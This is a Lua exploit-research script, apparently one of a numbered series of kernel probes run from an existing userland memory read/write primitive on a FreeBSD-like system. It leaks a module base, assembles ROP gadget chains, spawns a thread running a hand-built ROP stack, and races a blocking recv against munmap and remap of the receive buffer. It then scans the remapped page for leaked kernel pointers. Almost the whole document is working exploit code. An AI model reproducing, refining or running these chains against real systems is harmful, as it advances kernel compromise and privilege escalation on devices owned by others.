-- CRASH_CLASS: MODERATE
-- PROBE 398d: recv blocking + munmap + write trigger race
--
-- The sysctl race (398c) always lost: munmap completes before copyout starts.
-- New design: child blocks in recv(), main munmaps the recv buffer and remaps
-- a fresh page, then writes data to trigger kernel copyout on the new page.
-- If kernel doesn't re-validate the buffer VA after wakeup, the data lands
-- on our fresh page. If kernel does re-validate, recv returns EFAULT.
-- Either way: what does the kernel write to the remapped page?

print("=== PROBE 398d: recv+munmap race ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)

local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end)

local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x200)
for i = 0, 0x1FC, 4 do wd(N(shared) + i, 0) end

local sf_lo, sf_hi = g_lohi(0x992)
local CHILD_STK = 0x800

-- ============================================
-- PART A: Sanity — socketpair + child recv + main write
-- ============================================
print("")
print("-- A: socketpair baseline --")

local spbuf = memory.alloc(16)
wd(N(spbuf), 0xFFFF); wd(N(spbuf)+4, 0xFFFF)
local ok_sp, rv_sp = pcall(function()
    return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf)))
end)
local sock_r = rd(N(spbuf)) or -1
local sock_w = rd(N(spbuf) + 4) or -1
print(string.format("socketpair=%d fds=%d,%d", ok_sp and N(rv_sp) or -999, sock_r, sock_w))

if sock_r < 0 or sock_w < 0 then
    print("socketpair failed"); return
end

-- Baseline: main write, main read (no child)
local test_data = memory.alloc(32)
wd(N(test_data), 0x41424344)     -- "ABCD"
wd(N(test_data) + 4, 0x45464748) -- "EFGH"
local ok_wr, rv_wr = pcall(function()
    return mk(4)(uint64(sock_w), uint64(N(test_data)), uint64(8))
end)
print(string.format("write=%d", ok_wr and N(rv_wr) or -999))

local recv_buf = memory.alloc(32)
for i = 0, 28, 4 do wd(N(recv_buf) + i, 0xCC) end
local ok_rd2, rv_rd2 = pcall(function()
    return mk(3)(uint64(sock_r), uint64(N(recv_buf)), uint64(32))
end)
local recv_ret = ok_rd2 and N(rv_rd2) or -999
local d0 = rd(N(recv_buf)) or 0xCC
local d1 = rd(N(recv_buf) + 4) or 0xCC
print(string.format("read=%d data=%08X %08X", recv_ret, d0, d1))
if not alive() then print("CANARY FAIL A"); return end

-- ============================================
-- PART B: Child recv baseline (no race)
-- ============================================
print("")
print("-- B: child recv baseline --")

-- Prepare receive buffer
local victim = memory.alloc(0x4000)
for i = 0, 0x3FFC, 4 do wd(N(victim) + i, 0xEE) end

-- Build child: sysarch + recv(sock_r, victim, 0x100) + store ret + exit
local cstk = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
local cbase = N(cstk)
local crsp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8
local sp = crsp
local function push(val) wq(sp, val); sp = sp + 8 end

-- sysarch
push(uint64(165))
push(pop_rdi_ret); push(uint64(129))
push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
push(pop_rdx_ret); push(uint64(0))
push(pop_rcx_ret); push(uint64(0))
push(stub)

-- recv/read(sock_r, victim, 0x100) — will BLOCK until main writes
push(pop_rax_ret); push(uint64(3)) -- read syscall
push(pop_rdi_ret); push(uint64(sock_r))
push(pop_rsi_ret); push(uint64(N(victim)))
push(pop_rdx_ret); push(uint64(0x100))
push(pop_rcx_ret); push(uint64(0))
push(stub)

-- Store read return
push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
push(mov_rdi_rax)

-- Done marker
push(pop_rdi_ret); push(uint64(N(shared)))
push(pop_rax_ret); push(uint64(0xBBBB))
push(mov_rdi_rax)

push(pop_rax_ret); push(uint64(431))
push(pop_rdi_ret); push(uint64(0))
push(stub)

wd(N(shared), 0)
wd(N(shared) + 0x10, 0xFF)

-- Launch child (it will block in recv)
local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
w64(N(pa), sf_lo, sf_hi)
w64(N(pa) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
w64(N(pa) + 0x18, CHILD_STK, 0)
pcall(function() mk(455)(uint64(N(pa)), uint64(0x38)) end)

-- Small delay to let child enter recv
local dummy = 0
for i = 1, 50000 do dummy = dummy + 1 end

-- Write data to trigger recv return
local send_data = memory.alloc(32)
wd(N(send_data), 0x11223344)
wd(N(send_data)+4, 0x55667788)
pcall(function() mk(4)(uint64(sock_w), uint64(N(send_data)), uint64(8)) end)

-- Wait for child
for i = 1, 100000 do dummy = dummy + 1 end

local child_done = rd(N(shared)) or 0
local recv_ret2 = rd(N(shared) + 0x10) or 0xFF
local v_d0 = rd(N(victim)) or 0xEE
local v_d1 = rd(N(victim) + 4) or 0xEE
print(string.format("child_done=%X recv=%d data=%08X %08X",
    child_done, recv_ret2, v_d0, v_d1))
if not alive() then print("CANARY FAIL B"); return end

-- Close these sockets, create fresh ones for the race
pcall(function() mk(6)(uint64(sock_r)) end)
pcall(function() mk(6)(uint64(sock_w)) end)

-- ============================================
-- PART C: THE RACE — recv + munmap + remap + write
-- ============================================
print("")
print("-- C: recv + munmap race --")

local RACE_COUNT = 15
local data_on_remap = 0
local kptr_found = 0
local recv_efault = 0
local recv_ok_count = 0

for iter = 1, RACE_COUNT do
    -- Fresh socketpair each iteration
    wd(N(spbuf), 0xFFFF); wd(N(spbuf)+4, 0xFFFF)
    local ok_sp2, rv_sp2 = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(spbuf)))
    end)
    local sr = rd(N(spbuf)) or -1
    local sw = rd(N(spbuf) + 4) or -1
    if sr < 0 or sw < 0 then print("[" .. iter .. "] socketpair fail"); break end

    -- Map victim page
    local ok_vp, vpage = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local vh, vl = 0, 0
    if ok_vp and vpage then vh, vl = get_hi_lo(vpage) end
    if vh == 0 and vl == 0 then
        pcall(function() mk(6)(uint64(sr)) end)
        pcall(function() mk(6)(uint64(sw)) end)
        print("[" .. iter .. "] mmap fail"); break
    end
    local vbase = vl + vh * 0x100000000
    for i = 0, 0x3FFC, 4 do wd(vbase + i, 0xEEEEEEEE) end

    -- Build child: sysarch + read(sr, vpage, 0x1000) — blocks waiting for data
    local cs = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cs) + i, 0) end
    local cb = N(cs)
    local cr = ((cb + CHILD_STK) - ((cb + CHILD_STK) % 16)) - 8
    sp = cr

    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- read(sr, vpage, 0x1000) — BLOCKS here
    push(pop_rax_ret); push(uint64(3))
    push(pop_rdi_ret); push(uint64(sr))
    push(pop_rsi_ret); push(vpage)
    push(pop_rdx_ret); push(uint64(0x1000))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Store read return
    push(pop_rdi_ret); push(uint64(N(shared) + 0x10))
    push(mov_rdi_rax)

    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xAAAA))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    wd(N(shared), 0)
    wd(N(shared) + 0x10, 0xFF)

    -- Launch child
    local pa3 = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa3) + i, 0) end
    w64(N(pa3), sf_lo, sf_hi)
    w64(N(pa3) + 0x10, cb % 0x100000000, math.floor(cb / 0x100000000))
    w64(N(pa3) + 0x18, CHILD_STK, 0)
    pcall(function() mk(455)(uint64(N(pa3)), uint64(0x38)) end)

    -- Wait for child to enter blocking read
    dummy = 0
    for i = 1, 30000 do dummy = dummy + 1 end

    -- ★ THE RACE: munmap victim page + remap fresh zeroed page
    pcall(function() mk(73)(vpage, uint64(0x4000)) end)
    local ok_rm, remap = pcall(function()
        return mk(477)(vpage, uint64(0x4000), uint64(0x3),
            uint64(0x1012), uint64(0xFFFFFFFF), uint64(0))
    end)
    local rmh, rml = 0, 0
    if ok_rm and remap then rmh, rml = get_hi_lo(remap) end
    local remap_ok = (rmh == vh and rml == vl)

    -- NOW write data to wake up the child's recv
    -- The kernel should copyout to the VA (which now points to our fresh page)
    local sdata = memory.alloc(64)
    wd(N(sdata), 0xFACEFACE)
    wd(N(sdata)+4, 0xCAFEBABE)
    wd(N(sdata)+8, 0xDEADBEEF)
    wd(N(sdata)+12, 0x12345678)
    pcall(function() mk(4)(uint64(sw), uint64(N(sdata)), uint64(16)) end)

    -- Wait for child to finish
    for i = 1, 100000 do dummy = dummy + 1 end

    local child_done = rd(N(shared)) or 0
    local child_recv = rd(N(shared) + 0x10) or 0xFF

    -- Check what's on the remapped page
    if remap_ok then
        local rbase = vl + vh * 0x100000000
        local d0 = rd(rbase) or 0
        local d1 = rd(rbase + 4) or 0
        local d2 = rd(rbase + 8) or 0
        local d3 = rd(rbase + 12) or 0

        local has_data = (d0 ~= 0 or d1 ~= 0 or d2 ~= 0 or d3 ~= 0)
        if has_data then
            data_on_remap = data_on_remap + 1
            -- Did the kernel write our sent data to the remapped page?
            local is_ours = (d0 == 0xFACEFACE and d1 == 0xCAFEBABE)
            print(string.format("[%d] DATA on remap: %08X %08X %08X %08X recv=%d %s",
                iter, d0, d1, d2, d3, child_recv,
                is_ours and "OUR_DATA" or "UNKNOWN"))

            -- Scan for kernel pointers
            for off = 0, 0x100, 4 do
                local v = rd(rbase + off) or 0
                local vvh = math.floor(v / 0x10000)
                if vvh >= 0xFFFF8000 and vvh ~= 0xFFFFFFFF then
                    kptr_found = kptr_found + 1
                    print(string.format("[%d] KPTR +%03X: %08X", iter, off, v))
                end
            end
        end

        -- What happened to the child's recv?
        if child_recv > 0 and child_recv < 0x2000 then
            recv_ok_count = recv_ok_count + 1
        else
            recv_efault = recv_efault + 1
        end

        pcall(function() mk(73)(remap, uint64(0x4000)) end)
    else
        pcall(function() mk(73)(vpage, uint64(0x4000)) end)
        if rmh > 0 or rml > 0 then
            pcall(function() mk(73)(remap, uint64(0x4000)) end)
        end
    end

    pcall(function() mk(6)(uint64(sr)) end)
    pcall(function() mk(6)(uint64(sw)) end)

    if not alive() then print("CANARY FAIL iter " .. iter); break end
end

print(string.format("result: data_on_remap=%d kptr=%d recv_ok=%d recv_efault=%d",
    data_on_remap, kptr_found, recv_ok_count, recv_efault))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 398d COMPLETE ===")
